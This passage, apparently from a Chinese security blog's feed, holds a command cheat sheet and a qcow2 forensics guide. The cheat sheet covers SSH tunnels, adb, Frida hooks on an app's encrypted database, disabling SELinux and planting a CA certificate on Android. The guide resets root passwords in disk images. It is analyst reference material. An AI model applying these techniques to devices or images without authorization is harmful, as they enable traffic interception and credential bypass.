&lt;p&gt;&lt;img src=&quot;./ssh_socks5_proxy_linux.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# -D：指定本地监听IP和端口
# -q：静默模式
# -C：压缩节约带宽
# -N：不执行远端命令，仅转发流量
# -f：在后台运行
# user@remote：远程用户@远程主机
ssh -D 0.0.0.0:1337 -q -C -N -f user@remote
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;其他&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;# 本地端口转发 ssh -LNf local-port:target-host:target-port tunnel-host
# -L：转发本地端口。
# -N：不发送任何命令，只用来建立连接。没有这个参数，会在 SSH 服务器打开一个 Shell。
# -f：将 SSH 连接放到后台。没有这个参数，暂时不用 SSH 连接时，终端会失去响应。
ssh -L 3306:192.168.31.194:3306 root@127.0.0.1 

# 远程端口转发 ssh -R target-port:local-host:local-port tunnel-host
# -R：转发远程端口。
ssh -R 9999:192.168.2.3:9999 root@1.1.1.1

# 通过~/.ssh/config配置github代理
#Host github.com
#    HostName github.com
#    ProxyCommand nc -v -X connect -x 127.0.0.1:9999 %h %p
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;2. Android&lt;/h1&gt;
&lt;h2&gt;2.1. adb&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;adb reboot bootloader              # 进入fastboot

adb shell am start -a android.intent.action.VIEW -d scheme:// # 访问指定url

adb shell settings put global http_proxy 127.0.0.1:9999 # 设置代理

adb shell settings put global http_proxy :0 # 取消代理

setenforce 0 # 关闭SELinux

setprop persist.device_config.runtime_native.usap_pool_enabled false # 关闭usap

settings put system screen_off_timeout 100000000 # 设置屏幕常亮
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2.2. fastboot&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;fastboot reboot                    # 重启
fastboot boot boot.img             # 临时进入boot镜像
fastboot flash boot boot.img       # 刷入boot镜像
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2.3. 逆向&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Android Backup包&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;java -jar abe.jar unpack cat.ab cat.tar # Android Backup包转换
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;jadx&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;jadx-gui --show-bad-codes  # jadx无损启动
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Xamarin逆向&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;import sys, struct, lz4.block, os.path

def main():
	if len(sys.argv) != 2:
		sys.exit(&quot;[i] Usage: &quot; + sys.argv[0]  + &quot; in_file.dll&quot;)

	in_file = sys.argv[1]

	with open(in_file, &quot;rb&quot;) as compressed_file:
		compressed_data = compressed_file.read()

	header = compressed_data[:4]

	if header != b&apos;XALZ&apos;:
		sys.exit(&quot;[!] Wrong header, aborting...!&quot;)

	packed_payload_len = compressed_data[8:12]
	unpacked_payload_len = struct.unpack(&apos;&amp;lt;I&apos;, packed_payload_len)[0]
	compressed_payload = compressed_data[12:]
	decompressed_payload = lz4.block.decompress(compressed_payload, uncompressed_size=unpacked_payload_len)

	out_file = in_file.rsplit(&quot;.&quot;,1)[0] + &quot;_out.dll&quot;

	if os.path.isfile(out_file):
		sys.exit(&quot;[!] Output file [&quot; + out_file  + &quot;] already exists, aborting...!&quot;)

	with open(out_file, &quot;wb&quot;) as decompressed_file:
		decompressed_file.write(decompressed_payload)
		print( &quot;[i] Success!&quot;)
		print( &quot;[i] File [&quot; + out_file + &quot;] was created as result!&quot;)

if __name__ == &quot;__main__&quot;:
	main()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2.4 系统证书&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;# 计算证书pem格式的hash
openssl x509 -subject_old_hash -in a.pem

# 重命名&amp;lt;hash&amp;gt;.0
mv a.pem &amp;lt;hash&amp;gt;.0

# Create a separate temp directory, to hold the current certificates
# Without this, when we add the mount we can&apos;t read the current certs anymore.
mkdir -m 700 /data/local/tmp/htk-ca-copy

# Copy out the existing certificates
cp /system/etc/security/cacerts/* /data/local/tmp/htk-ca-copy/

# Create the in-memory mount on top of the system certs folder
mount -t tmpfs tmpfs /system/etc/security/cacerts

# Copy the existing certs back into the tmpfs mount, so we keep trusting them
mv /data/local/tmp/htk-ca-copy/* /system/etc/security/cacerts/

# Copy our new cert in, so we trust that too
cp /data/local/tmp/&amp;lt;hash&amp;gt;.0  /system/etc/security/cacerts/

# Update the perms &amp;amp; selinux context labels, so everything is as readable as before
chown root:root /system/etc/security/cacerts/*
chmod 644 /system/etc/security/cacerts/*
chcon u:object_r:system_file:s0 /system/etc/security/cacerts/*

# Delete the temp cert directory &amp;amp; this script itself
rm -r /data/local/tmp/htk-ca-copy
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;3. Frida&lt;/h1&gt;
&lt;h2&gt;3.1. 堆栈打印&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Java.perform(function(){
    var SQLiteDatabase = Java.use(&quot;com.tencent.wcdb.database.SQLiteDatabase&quot;);
    SQLiteDatabase[&quot;open&quot;].implementation = function (bArr, sQLiteCipherSpec, i15) {
        console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()));  //java层打印堆栈
        console.log(&apos;open is called&apos; + &apos;, &apos; + &apos;bArr: &apos; + JSON.stringify(bArr) + &apos;, &apos; + &apos;sQLiteCipherSpec: &apos; + sQLiteCipherSpec + &apos;, &apos; + &apos;i15: &apos; + i15);
        var ret = this.open(bArr, sQLiteCipherSpec, i15);
        console.log(&apos;open ret value is &apos; + ret);
        return ret;
    };
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3.2 函数hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Java.perform(function(){
    var e = Java.use(&quot;ir3.e&quot;);
    e[&quot;r&quot;].implementation = function (str, str2, i15, z15) {
        console.log(&apos;r is called&apos; + &apos;, &apos; + &apos;str: &apos; + str + &apos;, &apos; + &apos;str2: &apos; + str2 + &apos;, &apos; + &apos;i15: &apos; + i15 + &apos;, &apos; + &apos;z15: &apos; + z15);
        var ret = this.r(str, str2, i15, z15);
        console.log(&apos;r ret value is &apos; + ret);
        return ret;
    };
});
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;4. Windows&lt;/h1&gt;
&lt;h2&gt;4.1. hyper-v&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All # 开启hyper-v
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;5. 证书&lt;/h1&gt;
&lt;h2&gt;5.1. openssl&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ssh-keygen -y -f ~/.ssh/id_rsa # ssh-keygen导出公钥
openssl x509 -in a.cer -inform der -out a.pem -outform pem # der to pem
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;6. Docker&lt;/h1&gt;
&lt;h2&gt;6.1. Docker Desktop version on Mac&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;# https://stackoverflow.com/questions/64221861/an-error-failed-to-solve-with-frontend-dockerfile-v0
export DOCKER_BUILDKIT=0
export COMPOSE_DOCKER_CLI_BUILD=0

# snap docker 国内源
# /var/snap/docker/current/config/daemon.json
# {
#     &quot;log-level&quot;:        &quot;error&quot;,
#     &quot;registry-mirrors&quot;: [
#         &quot;https://docker.mirrors.ustc.edu.cn&quot;
#     ]
# }
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;7. Linux&lt;/h1&gt;
&lt;h2&gt;7.1. 扩容&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;# lvextend -L 10G /dev/mapper/ubuntu--vg-ubuntu--lv         //增大或减小至19G
# lvextend -L +10G /dev/mapper/ubuntu--vg-ubuntu--lv        //增加10G
# lvreduce -L -10G /dev/mapper/ubuntu--vg-ubuntu--lv        //减小10G
# lvresize -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv   //按百分比扩
sudo lvresize -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
# 执行resize2fs使扩容生效
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;7.2. 自动挂载&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;crontab -e
# @reboot mount /dev/sdb /home/docker/data
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;7.3. 命令行操作&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;for i in *; do mv $i ${i}.zip; done # 批量加后缀
for i in *; do mv $i ${i%.*}.zip; done # 批量改后缀
SCRIPT_DIR=$( dirname $(readlink -f $0) ) # 当前目录
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;8. Mysql&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;# 创建账号及修改账号权限
CREATE DATABASE bizsec CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
CREATE USER &apos;bizsec&apos;@&apos;%&apos; IDENTIFIED BY &apos;password&apos;;
GRANT ALL PRIVILEGES ON bizsec.* TO &apos;bizsec&apos;@&apos;%&apos;;
FLUSH PRIVILEGES;
SELECT User, Password, Host FROM mysql.user;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;9. NodeJS&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;npm config set registry http://mirrors.cloud.tencent.com/npm/ # 配置
npm config get registry # 验证
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;9.1. elecetron反编译&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;# https://stackoverflow.com/questions/38523617/how-to-unpack-an-asar-file
npm install -g @electron/asar
npx @electron/asar extract app.asar app # Extract the whole archive:
npx @electron/asar extract-file app.asar main.js #Extract a particular file:
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;10. 参考文献&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters/#set-up-socks5-ssh-tunnel&quot;&gt;Create a SOCKS proxy on a Linux server with SSH to bypass content filters&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>qcow2取证分析环境构建</title><link>https://picoorg.github.io/posts/qcow2%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/</link><guid isPermaLink="true">https://picoorg.github.io/posts/qcow2%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/</guid><description>在日常工作中，难免遇到一些镜像分析工作，当我们采用人工分析时，需要的常见命令在本文中进行总结。</description><pubDate>Fri, 30 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#qcow2%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA&quot;&gt;QCOW2取证分析环境构建&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%80qcow2%E7%AE%80%E4%BB%8B&quot;&gt;一、QCOW2简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BA%8Cqemu-img%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&quot;&gt;二、qemu-img的基本使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%89%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA&quot;&gt;三、分析环境构建&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#31-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8C%82%E8%BD%BD&quot;&gt;3.1 文件系统挂载&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#32-linux%E9%95%9C%E5%83%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9&quot;&gt;3.2 Linux镜像密码修改&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#321-virt-customize%E5%B7%A5%E5%85%B7&quot;&gt;3.2.1 virt-customize工具&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#312-guestfish%E6%89%8B%E5%8A%A8%E4%BF%AE%E6%94%B9&quot;&gt;3.1.2 guestfish手动修改&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#33-qemu%E5%90%AF%E5%8A%A8%E9%95%9C%E5%83%8F&quot;&gt;3.3 qemu启动镜像&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;QCOW2取证分析环境构建&lt;/h1&gt;
&lt;p&gt;在日常工作中，难免遇到一些镜像分析工作，当我们采用人工分析时，需要的常见命令在本文中进行总结。&lt;/p&gt;
&lt;h2&gt;一、QCOW2简介&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;KVM&lt;/code&gt;虚拟化中使用的镜像格式通常为&lt;code&gt;RAW&lt;/code&gt;和&lt;code&gt;QCOW2&lt;/code&gt;两种格式，&lt;code&gt;QCOW2&lt;/code&gt;镜像格式是目前虚拟化中主流的镜像格式。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/libyal/libqcow/blob/main/documentation/QEMU%20Copy-On-Write%20file%20format.asciidoc&quot;&gt;原文&lt;/a&gt;QEMU copy-on-write format with a range of special features, including the ability to take multiple snapshots, smaller images on filesystems that don’t support sparse files, optional AES encryption, and optional zlib compression.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;QCOW(QEMU copy-on-write)镜像文件具有一系列特性, 包括多重快照(能够创建基于之前镜像的新镜像，速度更快)，体积更小(不支持稀疏特性，不会预先分配指定&lt;code&gt;Size&lt;/code&gt;的存储空间)，可选&lt;code&gt;AES&lt;/code&gt;加密方式，可选&lt;code&gt;zlib&lt;/code&gt;压缩方式等功能。&lt;/p&gt;
&lt;h2&gt;二、qemu-img的基本使用&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;创建 QCOW2 镜像文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ qemu-img create -f qcow2 img.qcow2 4G
Formatting &apos;img.qcow2&apos;, fmt=qcow2 size=4294967296 encryption=off cluster_size=65536 lazy_refcounts=off
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 QCOW2 镜像文件信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ qemu-img info img.qcow2
image: img.qcow2
file format: qcow2
virtual size: 4.0G (4294967296 bytes)
disk size: 196K
cluster_size: 65536
Format specific information:
    compat: 1.1
    lazy refcounts: false
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建 QCOW2 的快照&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ qemu-img snapshot -c snap img.qcow2
# 再次查看 QCOW2 镜像文件信息, 可以看见快照列表
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;删除 QCOW2 镜像文件的快照&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ qemu-img snapshot -d snap img.qcow2
# 再次查看 QCOW2 镜像文件信息, 可以看见快照被删除
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;快照恢复&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ qemu-img snapshot -a snap img.qcow2
# 以快照位置启动
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;QCOW2 镜像文件转换成 RAW 格式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ qemu-img convert img.qcow2 -O raw raw.img
# 转化为RAW格式
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;三、分析环境构建&lt;/h2&gt;
&lt;p&gt;大部分工具包含在&lt;a href=&quot;https://libguestfs.org/&quot;&gt;libguestfs&lt;/a&gt;库中，相应工具下载&lt;code&gt;release&lt;/code&gt;版本&lt;code&gt;guestfs-tools&lt;/code&gt;即可。&lt;/p&gt;
&lt;h3&gt;3.1 文件系统挂载&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;安装&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get install guestfs-tools
guestfs-tools is already the newest version (1.52.0-3).
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;挂载&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 创建挂载点
$ mkdir -p /mnt/qcow2
# 只读模式
$ sudo guestmount -a /path/to/img.qcow2 -i --ro /mnt/qcow2
# 读写模式
$ sudo guestmount -a /path/to/img.qcow2 -i /mnt/qcow2
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;3.2 Linux镜像密码修改&lt;/h3&gt;
&lt;p&gt;当处于特殊情况无法获得Linux用户密码，启动镜像又无法登陆进系统时，就需要考虑通过修改镜像的方式强制更新密码。方法有很多，这里列举工具和手工两种方式&lt;/p&gt;
&lt;h4&gt;3.2.1 virt-customize工具&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;安装&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get install guestfs-tools
guestfs-tools is already the newest version (1.52.0-3).
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改root密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo virt-customize -a /path/to/img.qcow2 --root-password password:1234569
[   0.0] Examining the guest ...
[  15.0] Setting a random seed
[  15.3] Setting passwords
[  21.7] SELinux relabelling
[  21.9] Finishing off
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;3.1.2 guestfish手动修改&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;安装&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get install libguestfs-tools
libguestfs-tools is already the newest version (1:1.52.0-6.1).
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;生成随机密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl passwd -1 123456
$1$YA53Va4U$F1w1stz83NO8ee4kCgtzQ1
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;进入文件系统&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo guestfish --rw -a /path/to/img.qcow2

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
    ‘man’ to read the manual
    ‘quit’ to quit the shell

&amp;gt;&amp;lt;fs&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;lt;fs&amp;gt; run
100% ⟦▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒⟧ --:--
&amp;gt;&amp;lt;fs&amp;gt; list-filesystems 
/dev/sda1: unknown
/dev/sda2: ext4
&amp;gt;&amp;lt;fs&amp;gt; mount /dev/sda2 / # 选择文件系统挂载
&amp;gt;&amp;lt;fs&amp;gt; vi /etc/shadow # 修改root密码为openssl生成的随机密码
                     # 形如root:!!:19017:0:99999:7:::
                     # 改为root:$1$YA53Va4U$F1w1stz83NO8ee4kCgtzQ1:19017:0:99999:7:::
&amp;gt;&amp;lt;fs&amp;gt; quit
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;3.3 qemu启动镜像&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;qemu挂载文件系统&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# -hda: 镜像路径
# -m: 内存
# -net: 转发ssh端口到主机的40022
$ qemu-system-x86_64 -hda /path/to/img.qcow2 -m 8G -net nic -net user,hostfwd=tcp::40022-:22
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;qemu serial console登陆&lt;/p&gt;
&lt;p&gt;直接输入账号root和修改后的密码123456即可。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;localhost login: root
password:
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ssh登陆&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 根据提示输入密码
$ ssh root@localhost -p40022
root@localhost&apos;s password:
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content:encoded></item></channel></rss>